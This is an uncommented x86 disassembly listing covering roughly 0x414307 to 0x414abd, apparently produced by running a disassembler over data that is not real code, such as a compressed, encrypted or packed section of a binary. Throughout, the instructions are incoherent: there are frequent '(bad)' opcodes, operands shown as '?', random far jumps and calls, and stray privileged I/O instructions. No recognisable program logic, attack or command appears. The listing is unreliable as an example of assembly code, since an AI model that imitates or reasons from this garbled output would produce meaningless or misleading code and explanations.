  414307:	push   ecx
  414308:	int    0x6c
  41430a:	(bad)
  41430f:	jbe    0x414348
  414311:	pop    DWORD PTR [edx+edx*4+0x7ab9bf16]
  414318:	dec    ecx
  414319:	scas   al,BYTE PTR es:[edi]
  41431a:	call   0xd958:0x914fb393
  414321:	das    
  414322:	dec    ebp
  414323:	jecxz  0x4142c8
  414325:	mov    WORD PTR [ecx+0x423f2425],fs
  41432b:	push   esp
  41432c:	push   es
  41432d:	ret    
  41432e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41432f:	sbb    al,BYTE PTR [eax+0x7784a7c8]
  414335:	adc    eax,0x4b6b88e9
  41433a:	out    dx,eax
  41433b:	arpl   si,bp
  41433d:	mov    edx,0xc65aa0a1
  414342:	add    BYTE PTR [edx+eax*4],bh
  414345:	mov    esi,0x75cfb5ef
  41434a:	jno    0x414336
  41434c:	xchg   esi,eax
  41434d:	fcom   QWORD PTR [ebx+0x46ea8087]
  414353:	arpl   WORD PTR [edi+edi*8],bx
  414356:	mov    ah,0xc4
  414358:	dec    eax
  414359:	sub    eax,0x7cba7515
  41435e:	ja     0x41432b
  414360:	push   ebx
  414361:	cdq    
  414362:	mov    ebx,0xa5341999
  414367:	and    eax,0x26fa425f
  41436c:	mov    ebx,0x9e7d790f
  414371:	sar    dh,0x77
  414374:	dec    edi
  414375:	add    cl,0x5d
  414378:	mov    edx,0x686b7689
  41437d:	adc    ah,ch
  41437f:	jge    0x414332
  414381:	sub    DWORD PTR [ebp+0x35],eax
  414384:	fdiv   DWORD PTR [ebx]
  414386:	push   cs
  414387:	rcr    ah,cl
  414389:	inc    esi
  41438a:	mov    dl,0x6b
  41438c:	mov    cl,0x61
  41438e:	popa   
  41438f:	retf   
  414390:	hlt    
  414391:	fmul   QWORD PTR [esi-0x2]
  414394:	loope  0x41440c
  414396:	add    ah,BYTE PTR [eax]
  414398:	jmp    0xca34:0x88bb24d9
  41439f:	(bad)  
  4143a0:	jecxz  0x414346
  4143a2:	jle    0x41440d
  4143a4:	ds clc 
  4143a6:	sub    ch,BYTE PTR [esi-0x2f]
  4143a9:	jecxz  0x4143c0
  4143ab:	mov    esi,0x877f34ab
  4143b0:	arpl   WORD PTR [ecx],bp
  4143b2:	pop    ebx
  4143b3:	mov    esp,0x37794d58
  4143b8:	daa    
  4143b9:	pusha  
  4143ba:	dec    edx
  4143bb:	mov    WORD PTR [ebp-0xc],?
  4143be:	push   ebp
  4143bf:	sub    DWORD PTR [edi+0x44],ebp
  4143c2:	pop    esp
  4143c3:	add    eax,0xacf42802
  4143c8:	xchg   ebx,eax
  4143c9:	div    DWORD PTR es:[ecx+0x26]
  4143cd:	stos   BYTE PTR es:[edi],al
  4143ce:	add    DWORD PTR [ecx],esi
  4143d0:	rcl    DWORD PTR [ecx-0x609c27c1],1
  4143d6:	iret   
  4143d7:	fdiv   QWORD PTR [edi-0x47]
  4143da:	push   0xdb53230f
  4143df:	jg     0x4143a0
  4143e1:	cmp    edx,DWORD PTR [edx]
  4143e3:	fsubr  DWORD PTR [edi+0x16]
  4143e6:	out    dx,eax
  4143e7:	lahf   
  4143e8:	sub    bh,BYTE PTR [ebx+0x1c]
  4143eb:	push   esi
  4143ec:	xor    al,BYTE PTR [edx]
  4143ee:	cmp    ebp,DWORD PTR [ebx+0x15]
  4143f1:	in     al,dx
  4143f2:	xchg   edi,eax
  4143f3:	fucomp st(4)
  4143f5:	push   esp
  4143f6:	adc    eax,0xd87d6f88
  4143fb:	mov    dl,0xec
  4143fd:	mov    eax,ds:0xb7743186
  414402:	xlat   BYTE PTR ds:[ebx]
  414403:	dec    ecx
  414404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414405:	mov    bl,0x64
  414407:	ss dec esp
  414409:	cdq    
  41440a:	mov    edi,gs
  41440c:	xchg   ebp,eax
  41440d:	ja     0x41445e
  41440f:	(bad)
  414413:	jmp    0xa48d:0x846f0da7
  41441a:	mov    bh,0x59
  41441c:	inc    ecx
  41441d:	ins    DWORD PTR es:[edi],dx
  41441e:	or     esi,DWORD PTR ds:0x2645b223
  414424:	and    eax,0x5f7e90f6
  414429:	adc    bl,dh
  41442b:	and    ch,BYTE PTR [ebx]
  41442d:	stos   DWORD PTR es:[edi],eax
  41442e:	jl     0x414452
  414430:	fwait
  414431:	cmp    BYTE PTR [eax+0x7911a23e],cl
  414437:	push   esp
  414438:	retf   
  414439:	and    DWORD PTR [ebx-0x1b],edi
  41443c:	mov    ebp,0xd0f24976
  414441:	or     al,0x3
  414443:	xchg   esi,eax
  414444:	push   ss
  414445:	adc    ebp,ebp
  414447:	aaa    
  414448:	pop    esi
  414449:	in     al,dx
  41444a:	cli    
  41444b:	ins    BYTE PTR es:[edi],dx
  41444c:	neg    DWORD PTR [esi-0x1174afe5]
  414452:	imul   ecx,DWORD PTR [edi-0x17],0x541b2a8e
  414459:	jns    0x414420
  41445b:	(bad)  
  41445c:	cmp    eax,0xb0036010
  414461:	xlat   BYTE PTR ds:[ebx]
  414462:	xor    DWORD PTR [edi],0x91bb1543
  414468:	cmp    ch,al
  41446a:	add    al,0x9d
  41446c:	out    dx,al
  41446d:	fisub  DWORD PTR [esi+0x51]
  414470:	pop    esi
  414471:	rol    al,0x14
  414474:	pop    ebp
  414475:	dec    ebx
  414476:	mov    bh,0x2a
  414478:	and    DWORD PTR [edx],edx
  41447a:	stos   DWORD PTR es:[edi],eax
  41447b:	mov    ch,0xe8
  41447d:	mov    ebx,DWORD PTR [ebp-0xd1b561b]
  414483:	scas   eax,DWORD PTR es:[edi]
  414484:	test   eax,0x758d9faf
  414489:	jne    0x41440d
  41448b:	inc    esi
  41448c:	push   edx
  41448d:	push   ebx
  41448e:	xchg   esi,eax
  41448f:	xchg   DWORD PTR [ecx+esi*4-0x32],esi
  414493:	(bad)  
  414494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414495:	arpl   WORD PTR [ebx],dx
  414497:	or     ecx,ebp
  414499:	inc    ebx
  41449a:	fdivr  DWORD PTR [ecx-0x2d4f767b]
  4144a0:	add    al,0xea
  4144a2:	or     esp,DWORD PTR [ebp+0x31]
  4144a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144a6:	cmp    al,BYTE PTR [ebp-0x26]
  4144a9:	pusha  
  4144aa:	int3   
  4144ab:	lahf   
  4144ac:	mov    al,0x6
  4144ae:	aam    0x5f
  4144b0:	dec    ebp
  4144b1:	push   cs
  4144b2:	ds std 
  4144b4:	(bad)  [edx]
  4144b6:	call   0xb4bc:0x9b780b8c
  4144bd:	call   0xeb9a:0x67c75154
  4144c4:	mov    ch,0xab
  4144c6:	mov    ecx,0xeddeed6b
  4144cb:	pop    esp
  4144cc:	sti    
  4144cd:	pop    eax
  4144ce:	jo     0x4144e2
  4144d0:	iret   
  4144d1:	and    al,BYTE PTR [edx]
  4144d3:	imul   esi,DWORD PTR [edx],0x6e
  4144d6:	loop   0x414498
  4144d8:	adc    DWORD PTR [esi-0x35],ecx
  4144db:	xchg   ebp,eax
  4144dc:	mov    bl,0x69
  4144de:	rcr    DWORD PTR [edx+0xfd1c4be],0x2f
  4144e5:	or     dh,dh
  4144e7:	push   0x923ea057
  4144ec:	aad    0x88
  4144ee:	je     0x41449c
  4144f0:	cvtpi2ps xmm1,mm2
  4144f3:	aaa    
  4144f4:	fdivr  DWORD PTR [ebx+0x23d417bc]
  4144fa:	mov    ds:0xa11688d4,al
  4144ff:	stos   BYTE PTR es:[edi],al
  414500:	add    edi,DWORD PTR [eax]
  414502:	xchg   BYTE PTR [edx],dh
  414504:	(bad)  
  414505:	xchg   ebp,eax
  414506:	xor    BYTE PTR [ebx+0x9],0xfd
  41450a:	popa   
  41450b:	scas   eax,DWORD PTR es:[edi]
  41450c:	in     eax,0x45
  41450e:	test   DWORD PTR [ecx+0x6ba9a55d],0x680489db
  414518:	xchg   ebx,eax
  414519:	or     edi,DWORD PTR [ebp+edx*1+0x23]
  41451d:	jle    0x4144b9
  41451f:	pusha  
  414520:	aad    0x71
  414522:	pop    ds
  414523:	test   BYTE PTR [edx+0x76],dh
  414526:	not    BYTE PTR ds:0x62442e7d
  41452c:	mov    dl,0xa7
  41452e:	sub    DWORD PTR [ebp-0x1de933c],ebx
  414534:	sbb    eax,0x69da0ff0
  414539:	sub    edx,DWORD PTR [esi-0x2bd3672d]
  41453f:	test   BYTE PTR [ebp-0x5a],dh
  414542:	test   BYTE PTR [edi+0x628679cd],dl
  414548:	cdq    
  414549:	push   ebx
  41454a:	xor    DWORD PTR [esi],ebp
  41454c:	stos   BYTE PTR es:[edi],al
  41454d:	adc    BYTE PTR [ebp+0xb],dl
  414550:	add    al,0xc5
  414552:	pop    ss
  414553:	lods   eax,DWORD PTR ds:[esi]
  414554:	imul   cx,WORD PTR [ebx+0x33],0x7849
  41455a:	test   BYTE PTR ds:0x737693d7,cl
  414560:	(bad)  
  414562:	stos   BYTE PTR es:[edi],al
  414563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414564:	outs   dx,BYTE PTR ds:[esi]
  414565:	cwde   
  414566:	icebp  
  414567:	popa   
  414568:	aam    0xd2
  41456a:	mov    WORD PTR [edi*2-0x3e1a422c],cs
  414571:	push   esi
  414572:	out    dx,al
  414573:	inc    ebp
  414574:	adc    DWORD PTR [ebp+ebx*8-0x6d],esp
  414578:	ins    DWORD PTR es:[edi],dx
  414579:	scas   eax,DWORD PTR es:[edi]
  41457a:	add    ch,BYTE PTR [esi+0x44a96c55]
  414580:	aas    
  414581:	pop    esi
  414582:	ds cmc 
  414584:	add    edi,DWORD PTR [ebp-0x75c87352]
  41458a:	xor    DWORD PTR [edx-0x35cc8d17],0x7202ffaf
  414594:	ficomp WORD PTR [ebx+0x6ded87d]
  41459a:	outs   dx,BYTE PTR ds:[esi]
  41459b:	(bad)  
  41459c:	shl    BYTE PTR [edi],1
  41459e:	inc    ecx
  41459f:	mov    edi,0xd1b54ede
  4145a4:	jl     0x41456a
  4145a6:	jmp    0x4eb0e375
  4145ab:	dec    edx
  4145ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145ad:	test   ebx,edi
  4145af:	add    DWORD PTR [edi+0x4e8871a1],edx
  4145b5:	inc    ebx
  4145b6:	int    0x66
  4145b8:	adc    eax,0x73723f67
  4145bd:	mov    bh,0xe7
  4145bf:	or     ch,cl
  4145c1:	jns    0x4145bf
  4145c3:	xchg   esp,eax
  4145c4:	dec    esp
  4145c5:	dec    edx
  4145c6:	loopne 0x41458e
  4145c8:	or     al,0xde
  4145ca:	mov    WORD PTR [ecx],ss
  4145cc:	dec    esp
  4145cd:	dec    esp
  4145ce:	cmp    cl,BYTE PTR [edi]
  4145d0:	daa    
  4145d1:	cmp    BYTE PTR [ebx],dh
  4145d3:	sub    eax,DWORD PTR [edi]
  4145d5:	jmp    0x4145b3
  4145d7:	cld    
  4145d8:	xor    eax,0x4039c0e1
  4145dd:	leave  
  4145de:	bound  edx,QWORD PTR [ebx+0xe599169]
  4145e4:	jns    0x414575
  4145e6:	call   0xb0f5:0x8c417b5c
  4145ed:	stc    
  4145ee:	dec    edi
  4145ef:	and    eax,DWORD PTR [ecx-0x26]
  4145f2:	add    dh,BYTE PTR [eax+0x53]
  4145f5:	push   edx
  4145f6:	fs test al,0xa6
  4145f9:	mov    ebx,0x38d00ea3
  4145fe:	or     edx,DWORD PTR [esi-0x171739cf]
  414604:	out    0x1d,al
  414606:	gs addr16 es cwd 
  41460b:	xchg   ecx,eax
  41460c:	shl    DWORD PTR [edi],cl
  41460e:	dec    edi
  41460f:	adc    eax,DWORD PTR [ebx+0x332bde78]
  414615:	mov    edi,0xd887d3c2
  41461a:	and    bh,BYTE PTR ds:0x1fbd83f0
  414620:	push   esi
  414621:	mov    eax,0xf60a1201
  414626:	out    0x23,al
  414628:	pop    ss
  414629:	hlt    
  41462a:	loope  0x41469f
  41462c:	cmp    eax,0x6ea54779
  414631:	ds mov eax,0xe6caafe
  414637:	jge    0x4146a4
  414639:	adc    BYTE PTR [ebp+0x4f5d6918],bh
  41463f:	ror    BYTE PTR [ebx+0x793d8d79],cl
  414645:	adc    al,0x5
  414647:	inc    ebx
  414648:	sbb    eax,0xe9a0823b
  41464d:	es or  ecx,ebx
  414650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414651:	rcl    BYTE PTR [edi+0x192eb45d],cl
  414657:	fadd   QWORD PTR [edx+0x31374e30]
  41465d:	call   0x3e31bba6
  414662:	leave  
  414663:	retf   0x3744
  414666:	jns    0x4146c0
  414668:	dec    edi
  414669:	outs   dx,DWORD PTR es:[esi]
  41466b:	inc    esi
  41466c:	dec    ebp
  41466d:	je     0x414651
  41466f:	(bad)  
  414670:	sti    
  414671:	repz lea ebx,[edi]
  414674:	pop    ss
  414675:	dec    ebp
  414676:	adc    DWORD PTR [ebp-0x2ba3fa0e],eax
  41467c:	dec    esi
  41467d:	jmp    0xc04f:0x7255c5b0
  414684:	sub    eax,0xa4243c2a
  414689:	mov    ds:0x55a1cca0,al
  41468e:	test   DWORD PTR [ebx+0x1a],edi
  414691:	sbb    DWORD PTR [esp+ecx*4+0x3a918fff],esp
  414698:	sub    al,0xa9
  41469a:	in     al,0x4a
  41469c:	mov    ecx,0x34f0ff1d
  4146a1:	jns    0x414638
  4146a3:	sub    BYTE PTR [ebx],dl
  4146a5:	lahf   
  4146a6:	or     bh,BYTE PTR [ecx+0x46]
  4146a9:	out    dx,al
  4146aa:	es shr al,0xaf
  4146ae:	inc    ebp
  4146af:	add    DWORD PTR [ebx],ebp
  4146b1:	mov    bh,0x8c
  4146b3:	or     bh,BYTE PTR ds:0x973b6dfd
  4146b9:	inc    ebx
  4146ba:	mov    bh,BYTE PTR [esi+0x548765f3]
  4146c0:	cmp    al,0xd9
  4146c2:	push   es
  4146c3:	lods   eax,DWORD PTR ds:[esi]
  4146c4:	inc    edx
  4146c5:	sti    
  4146c6:	mov    WORD PTR [ebx+0x15],cs
  4146c9:	retf   
  4146ca:	or     al,0xd0
  4146cc:	mov    eax,0x4bdd97ec
  4146d1:	scas   eax,DWORD PTR es:[edi]
  4146d2:	imul   ecx,DWORD PTR [ebx+0x44a96f87],0x5f41f394
  4146dc:	aas    
  4146dd:	sahf   
  4146de:	push   ebx
  4146df:	mov    ebp,edi
  4146e1:	dec    edi
  4146e2:	(bad)  
  4146e3:	mov    BYTE PTR [edi],0xb
  4146e6:	cld    
  4146e7:	ffreep st(4)
  4146e9:	int    0xd
  4146eb:	xchg   esi,eax
  4146ec:	pop    es
  4146ed:	add    al,0xae
  4146ef:	adc    esi,DWORD PTR [bx+di+0x4770]
  4146f4:	mov    ah,0x89
  4146f6:	sub    edx,edx
  4146f8:	in     eax,dx
  4146f9:	jb     0x414709
  4146fb:	repnz mov BYTE PTR [ebp-0x2ed13346],dh
  414702:	dec    ebx
  414703:	mov    ds:0xbeaae3e5,al
  414708:	(bad)
  41470c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41470d:	xor    eax,DWORD PTR [ecx]
  41470f:	xor    esp,DWORD PTR [esi-0x5b0ada95]
  414715:	inc    esi
  414716:	cmp    DWORD PTR [ebx+0x430d82f8],eax
  41471c:	gs xchg ebx,eax
  41471e:	xchg   esi,eax
  41471f:	and    BYTE PTR [esi+ecx*1-0x15577681],bl
  414726:	ret    0xe27c
  414729:	in     al,0xb2
  41472b:	bound  ecx,QWORD PTR [esi-0x35]
  41472e:	in     al,dx
  41472f:	sub    al,0x1
  414731:	mov    dl,0x87
  414733:	hlt    
  414734:	pop    eax
  414735:	cmp    ebp,edi
  414737:	data16 (bad) 
  414739:	or     BYTE PTR [ecx+0x1552014b],al
  41473f:	in     eax,0xf6
  414741:	pop    ebx
  414742:	mov    edx,0x6c94d873
  414747:	nop
  414748:	shl    DWORD PTR [edi+0x64116100],0x9
  41474f:	mov    dh,0x67
  414751:	rcr    bh,1
  414753:	shl    BYTE PTR [eax+0x5a9ce98c],0xa6
  41475a:	cmp    bh,BYTE PTR [ebx+eax*1-0x7d]
  41475e:	pop    ebx
  41475f:	fcmovb st,st(0)
  414761:	or     ah,ch
  414763:	test   DWORD PTR [edx],ebx
  414765:	jle    0x4146e9
  414767:	out    dx,al
  414768:	jnp    0x41471f
  41476a:	push   ebx
  41476b:	inc    esp
  41476c:	lea    edx,[edx-0x34c504e9]
  414772:	into   
  414773:	sbb    al,0xbd
  414775:	mov    ?,WORD PTR [ebp-0x1d620cb6]
  41477b:	call   0x849d:0x2aae7a9f
  414782:	daa    
  414783:	xor    bl,BYTE PTR [ecx]
  414785:	cdq    
  414786:	aad    0xd4
  414788:	sub    DWORD PTR [ecx+edx*4-0x77],edi
  41478c:	sub    ebp,DWORD PTR [esi-0x44c5a19e]
  414792:	mov    cl,0xde
  414794:	retf   
  414795:	sbb    eax,0x1e042ef9
  41479a:	xchg   ebx,eax
  41479b:	sub    eax,0xb96ec71f
  4147a0:	fcmovne st,st(2)
  4147a2:	(bad)  
  4147a3:	cmc    
  4147a4:	pop    eax
  4147a5:	ds out 0x5,al
  4147a8:	jo     0x414765
  4147aa:	add    DWORD PTR [esi+0x74],0x8b043df9
  4147b1:	mov    ebx,0x44761472
  4147b6:	(bad)  
  4147b7:	push   ss
  4147b8:	xchg   BYTE PTR [ebp-0x352318d7],bh
  4147be:	pop    ecx
  4147bf:	aam    0x6d
  4147c1:	adc    eax,0xbbe8f46f
  4147c6:	cmp    DWORD PTR [esi],esi
  4147c8:	fstp   TBYTE PTR [edi*8-0x43a3ebf8]
  4147cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d0:	xchg   ebp,eax
  4147d1:	lods   al,BYTE PTR ds:[esi]
  4147d2:	cmp    al,dl
  4147d4:	aam    0xc6
  4147d6:	popf   
  4147d7:	bound  ecx,QWORD PTR [edx+eax*2-0x5d]
  4147db:	mov    eax,0x982e8dea
  4147e0:	retf   0x8426
  4147e3:	jle    0x4147c9
  4147e5:	js     0x4147cc
  4147e7:	pop    ds
  4147e8:	scas   al,BYTE PTR es:[edi]
  4147e9:	sti    
  4147ea:	push   es
  4147eb:	mov    ah,bl
  4147ed:	mov    esi,DWORD PTR [esi-0x48]
  4147f0:	pop    ebx
  4147f1:	retf   
  4147f2:	fcmovnb st,st(7)
  4147f4:	mov    cl,0x92
  4147f6:	adc    bh,dh
  4147f8:	js     0x414824
  4147fa:	test   al,0xf4
  4147fc:	into   
  4147fd:	adc    eax,0xd54843ad
  414802:	enter  0xd587,0x7e
  414806:	xchg   BYTE PTR [edx-0xe4464b5],ah
  41480c:	pop    eax
  41480d:	mov    eax,0x5dab38a5
  414812:	cld    
  414813:	jle    0x4147a9
  414815:	push   ecx
  414816:	mov    BYTE PTR [esi+0x3e806c84],dl
  41481c:	jge    0x41481b
  41481e:	cmp    BYTE PTR [ecx+ecx*8+0x19],bl
  414822:	jno    0x414891
  414824:	pop    eax
  414825:	cli    
  414826:	shr    BYTE PTR [esi-0xd35f86],cl
  41482c:	sbb    dl,BYTE PTR [eax-0x158e32a9]
  414832:	push   ds
  414833:	int    0x15
  414835:	mov    ebp,0xe73a6068
  41483a:	out    0xf7,eax
  41483c:	loope  0x4148b4
  41483e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41483f:	in     al,dx
  414840:	inc    ecx
  414841:	xchg   ebp,eax
  414842:	pop    eax
  414843:	in     eax,0xb9
  414845:	jmp    0x4148ad
  414847:	pop    es
  414848:	and    cl,bh
  41484a:	mov    al,0x8f
  41484c:	int    0x86
  41484e:	jg     0x41483b
  414850:	daa    
  414851:	mov    ah,bh
  414853:	std    
  414854:	lea    edi,[ebx]
  414856:	add    eax,0xac73ed66
  41485b:	inc    edx
  41485c:	iret   
  41485d:	(bad)  
  41485e:	(bad)  
  41485f:	repz clc 
  414861:	je     0x414823
  414863:	fdivr  st(7),st
  414865:	cmp    esi,esi
  414867:	and    eax,0x94b9fb68
  41486c:	fidiv  DWORD PTR [eax]
  41486e:	dec    eax
  41486f:	push   eax
  414870:	mov    edx,0x246ee550
  414875:	xor    ebx,ebp
  414877:	test   BYTE PTR [edi-0x50967547],dh
  41487d:	nop
  41487e:	aaa    
  41487f:	js     0x4148f6
  414881:	je     0x4148a1
  414883:	inc    ebp
  414884:	out    dx,al
  414885:	test   eax,0x2719cf00
  41488a:	into   
  41488b:	stos   BYTE PTR es:[edi],al
  41488c:	jg     0x41481e
  41488e:	shl    DWORD PTR [ecx+0x39],1
  414891:	hlt    
  414892:	and    bl,BYTE PTR [edx-0x7d566585]
  414898:	dec    ebx
  414899:	in     al,0x6
  41489b:	dec    ebp
  41489c:	(bad)  [edx+0x50fad911]
  4148a2:	scas   al,BYTE PTR es:[edi]
  4148a3:	xor    DWORD PTR ds:0x9d7c2dd7,esi
  4148a9:	call   DWORD PTR [ecx]
  4148ab:	pop    edx
  4148ac:	jecxz  0x414873
  4148ae:	rcl    DWORD PTR [esi-0x7],cl
  4148b1:	mov    BYTE PTR [ebx],0x7b
  4148b4:	adc    bl,BYTE PTR [ecx]
  4148b6:	jmp    0x5c04:0x904f791d
  4148bd:	add    bl,BYTE PTR [edx+eiz*8]
  4148c0:	adc    DWORD PTR ds:0x5da64ecc,esp
  4148c6:	sbb    eax,ebp
  4148c8:	mov    bl,0xdb
  4148ca:	lahf   
  4148cb:	ss mov ah,0x6e
  4148ce:	enter  0xd9e,0xab
  4148d2:	pop    ecx
  4148d3:	ficom  DWORD PTR [edx]
  4148d5:	push   esp
  4148d6:	sti    
  4148d7:	popf   
  4148d8:	or     dl,BYTE PTR [ecx+0x2b]
  4148db:	leave  
  4148dc:	into   
  4148dd:	xor    al,0xe1
  4148df:	push   ecx
  4148e0:	shl    BYTE PTR [ebx+0x54861f78],1
  4148e6:	pop    esi
  4148e7:	add    eax,0x74638746
  4148ec:	xchg   esp,eax
  4148ed:	jnp    0x414968
  4148ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148f0:	aad    0x36
  4148f2:	je     0x414933
  4148f4:	retf   0xb1c8
  4148f7:	sbb    eax,0x7afbf79d
  4148fc:	call   0x86588501
  414901:	dec    esp
  414902:	hlt    
  414903:	lods   al,BYTE PTR ds:[esi]
  414904:	dec    ebp
  414905:	bound  ecx,QWORD PTR [ecx+edi*2]
  414908:	loop   0x414920
  41490a:	enter  0xe3de,0x6a
  41490e:	adc    eax,0x6353fbc3
  414913:	cmp    ch,BYTE PTR [edx-0x16bc638]
  414919:	stos   DWORD PTR es:[edi],eax
  41491a:	in     al,0xe1
  41491c:	(bad)  
  41491d:	enter  0xe73e,0xd5
  414921:	dec    ecx
  414922:	push   ss
  414923:	or     BYTE PTR gs:0x95614a0e,ch
  41492a:	ret    0x15f8
  41492d:	lahf   
  41492e:	xor    BYTE PTR [edi-0x72],ah
  414931:	fimul  WORD PTR [ebx]
  414933:	dec    edx
  414934:	sahf   
  414935:	or     al,0xbb
  414937:	jp     0x414948
  414939:	and    eax,0x817c3b27
  41493e:	repz fisttp DWORD PTR [edx]
  414941:	loop   0x4148e3
  414943:	call   DWORD PTR [ecx]
  414945:	in     al,dx
  414946:	mov    esp,0xc9ff8809
  41494b:	pusha  
  41494c:	adc    eax,0xcfc4ef8d
  414951:	pop    ecx
  414952:	pusha  
  414953:	cmp    ch,BYTE PTR [ebx+ecx*4]
  414956:	pop    eax
  414957:	test   eax,0x62709b8b
  41495c:	into   
  41495d:	inc    ebx
  41495e:	stos   BYTE PTR es:[edi],al
  41495f:	mov    DWORD PTR [ebx+0x49],eax
  414962:	mov    al,0x9d
  414964:	mov    ds:0xc9915da9,eax
  414969:	xchg   esp,eax
  41496a:	cmc    
  41496b:	fsubr  QWORD PTR [edx]
  41496d:	jns    0x4149b8
  41496f:	adc    bl,dl
  414971:	rcl    BYTE PTR [eax],cl
  414973:	lods   al,BYTE PTR ds:[esi]
  414974:	out    0x13,eax
  414976:	sti    
  414977:	outs   dx,DWORD PTR ds:[esi]
  414978:	adc    esp,DWORD PTR [esi]
  41497a:	add    eax,0xea57caf3
  41497f:	(bad)  
  414981:	inc    esp
  414982:	fcom   QWORD PTR [esi]
  414984:	in     eax,0x68
  414986:	(bad)  
  414987:	pop    edi
  414988:	sbb    ch,BYTE PTR [esi+0x7c]
  41498b:	dec    edx
  41498c:	inc    esi
  41498d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41498e:	mov    ds:0x84380544,eax
  414993:	(bad)  
  414994:	mov    cs,ebx
  414996:	add    ebx,edi
  414998:	lods   al,BYTE PTR ds:[esi]
  414999:	rcl    dl,0x74
  41499c:	jae    0x4149c5
  41499e:	repnz aas 
  4149a0:	adc    bh,BYTE PTR [edx]
  4149a2:	mov    ds:0x4dd18388,al
  4149a7:	fisubr DWORD PTR [ebx+ebp*4+0x57c03313]
  4149ae:	inc    esp
  4149af:	mov    DWORD PTR [ebx],esp
  4149b1:	dec    ebp
  4149b2:	jmp    0x654e:0x54f500f0
  4149b9:	adc    bl,BYTE PTR [esi-0x1]
  4149bc:	es inc ecx
  4149be:	pop    esp
  4149bf:	ja     0x414a10
  4149c1:	mov    dl,0x2b
  4149c3:	cli    
  4149c4:	into   
  4149c5:	mov    al,0xbf
  4149c7:	adc    ecx,DWORD PTR [esi+0x70]
  4149ca:	inc    esi
  4149cb:	pop    ebp
  4149cc:	pushf  
  4149cd:	mov    ebp,DWORD PTR [esi-0x4c9e7608]
  4149d3:	xchg   esi,eax
  4149d4:	test   al,0x91
  4149d6:	xchg   edx,eax
  4149d7:	repnz cs pushw 0xf76a
  4149dd:	cmp    DWORD PTR [ebx],0xfffffff4
  4149e0:	inc    esp
  4149e1:	pusha  
  4149e2:	inc    ecx
  4149e3:	dec    ebp
  4149e4:	pop    edx
  4149e5:	mov    ds:0x5d28817b,al
  4149ea:	in     eax,0xa2
  4149ec:	push   ds
  4149ed:	push   cs
  4149ee:	out    0x84,al
  4149f0:	push   ds
  4149f1:	int3   
  4149f2:	(bad)  
  4149f3:	adc    ah,BYTE PTR [ecx-0x12b87f7d]
  4149f9:	sub    al,BYTE PTR [esi-0x4fe4e9bd]
  4149ff:	mov    eax,0x16e98d08
  414a04:	dec    edi
  414a05:	pop    esi
  414a06:	mov    al,ds:0xcc8c89b6
  414a0b:	mov    al,0x97
  414a0d:	clc    
  414a0e:	je     0x414a5a
  414a10:	xlat   BYTE PTR ds:[ebx]
  414a11:	addr16 inc ebx
  414a13:	and    al,0xbf
  414a15:	jp     0x414999
  414a17:	sub    edi,ebx
  414a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a1a:	out    0xf9,eax
  414a1c:	lods   al,BYTE PTR ds:[esi]
  414a1d:	ror    DWORD PTR [esi+0xd],1
  414a20:	test   al,0xf7
  414a22:	jp     0x414a0c
  414a24:	inc    ebx
  414a25:	stos   DWORD PTR es:[edi],eax
  414a26:	xor    esi,DWORD PTR [eax-0x1d]
  414a29:	dec    edi
  414a2a:	clc    
  414a2b:	ja     0x4149e0
  414a2d:	jmp    0x414a31
  414a2f:	add    dl,ch
  414a31:	aam    0xd4
  414a33:	cmc    
  414a34:	add    ah,BYTE PTR [ebp-0x35]
  414a37:	inc    edx
  414a38:	jg     0x414a4e
  414a3a:	mov    ebp,0x6fb50668
  414a3f:	(bad)  
  414a41:	add    eax,0x1c5d6d6f
  414a46:	popa   
  414a47:	cmp    ebx,ecx
  414a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a4a:	dec    esi
  414a4b:	aad    0x86
  414a4d:	push   edx
  414a4e:	addr16 ret 
  414a50:	xchg   esp,eax
  414a51:	push   ds
  414a52:	jmp    0x414a46
  414a54:	popa   
  414a55:	(bad)  
  414a56:	out    0xf7,al
  414a58:	pop    es
  414a59:	xchg   ecx,eax
  414a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a5b:	mov    edx,DWORD PTR [edx+0x2c]
  414a5e:	jmp    0x4149ee
  414a60:	xchg   ebp,eax
  414a61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a62:	cli    
  414a63:	adc    eax,ecx
  414a65:	fcmovbe st,st(4)
  414a67:	xlat   BYTE PTR ds:[ebx]
  414a68:	xchg   DWORD PTR [edi+0x1031f272],esi
  414a6e:	iret   
  414a6f:	jmp    DWORD PTR [edi]
  414a71:	fnop   
  414a73:	inc    esp
  414a74:	inc    edi
  414a75:	popa   
  414a76:	pop    esi
  414a77:	xchg   ebp,eax
  414a78:	ins    DWORD PTR es:[edi],dx
  414a79:	lods   eax,DWORD PTR ds:[esi]
  414a7a:	jecxz  0x414a69
  414a7c:	mov    al,ds:0x2226297e
  414a81:	sbb    dl,bh
  414a83:	mov    WORD PTR [ebp+0x75],ds
  414a86:	ins    BYTE PTR es:[edi],dx
  414a87:	stos   BYTE PTR es:[edi],al
  414a88:	push   0xda59f736
  414a8d:	adc    ah,BYTE PTR [esi+0x23fbee91]
  414a93:	dec    ebx
  414a94:	cmp    bl,BYTE PTR [ecx+0x25]
  414a97:	xchg   esi,eax
  414a98:	add    ah,BYTE PTR [eax+0x78609167]
  414a9e:	ds stc 
  414aa0:	jle    0x414b0d
  414aa2:	cmp    al,0xed
  414aa4:	ret    
  414aa5:	xlat   BYTE PTR ds:[ebx]
  414aa6:	mov    dh,0xb6
  414aa8:	enter  0x7112,0x41
  414aac:	loope  0x414aab
  414aae:	and    eax,0x24ac38e4
  414ab3:	xchg   esi,eax
  414ab4:	(bad)  
  414ab5:	and    eax,DWORD PTR [eax+0x6e5cb95d]
  414abb:	xchg   ecx,eax
  414abc:	inc    edx
  414abd:	rol    edx,0x85
